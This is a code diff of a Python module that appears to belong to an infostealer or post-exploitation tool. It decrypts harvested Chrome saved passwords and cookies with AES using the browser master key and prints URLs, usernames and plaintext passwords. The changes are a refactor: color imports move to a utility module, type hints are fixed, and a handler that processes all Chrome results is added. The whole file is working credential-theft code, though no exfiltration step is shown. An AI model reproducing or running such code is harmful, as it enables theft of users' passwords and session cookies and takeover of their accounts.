@@ -1,10 +1,5 @@
 from Cryptodome.Cipher import AES
-from colored import fg
-
-block = fg('light_sky_blue_3a')
-title = fg('blue')
-main_title = fg('red')
-data = fg('dark_green_sea')
+from app.utils import title,block, main_title, data
 
 
 def decrypt_payload(cipher, payload):
@@ -29,7 +24,7 @@ def decrypt_cipher(encrypted_password, chrome_master_key):
         return "Unknown"
 
 
-def handle_chrome_passwords(creds_arr: [], chrome_master_key: str) -> None:
+def handle_chrome_passwords(creds_arr: list, chrome_master_key: str) -> None:
     print(main_title + "Chrome Credentials:")
     for num in creds_arr:
         creds_json = creds_arr.get(num)
@@ -39,7 +34,7 @@ def handle_chrome_passwords(creds_arr: [], chrome_master_key: str) -> None:
             [creds_json[0].get('url'), creds_json[1].get('username'), plaint_text_pass])
 
 
-def handle_chrome_cookies(cookies_arr: [], chrome_master_key: str) -> None:
+def handle_chrome_cookies(cookies_arr: list, chrome_master_key: str) -> None:
     print(main_title + "Chrome Cookies:")
     for cookie_obj in cookies_arr:
         cookie_domain = cookie_obj.get("Domain")
@@ -48,14 +43,22 @@ def handle_chrome_cookies(cookies_arr: [], chrome_master_key: str) -> None:
         output_chrome_cookies([cookie_domain, plaint_text_cookie])
 
 
-def output_chrome_credentials(print_object: []):
+def output_chrome_credentials(print_object: list):
     print(block + '[--]')
     print(title + '|Url|' + data + print_object[0])
     print(title + '|Username|' + data + print_object[1])
     print(title + '|Password|' + data + print_object[2])
 
 
-def output_chrome_cookies(print_object: []):
+def output_chrome_cookies(print_object: list):
     print(block + '[--]')
     print(title + '|Url|' + data + print_object[0])
     print(title + '|Value|' + data + print_object[1])
+
+def handle_all_chrome_modules(results: dict):
+    chrome_passwords = results.get("Chrome-Passwords")
+    chrome_master_key = results.get("Chrome-Masterkey")
+    handle_chrome_passwords(chrome_passwords, chrome_master_key)
+
+    chrome_cookies = results.get("Chrome-Cookies")
+    handle_chrome_cookies(chrome_cookies, chrome_master_key)
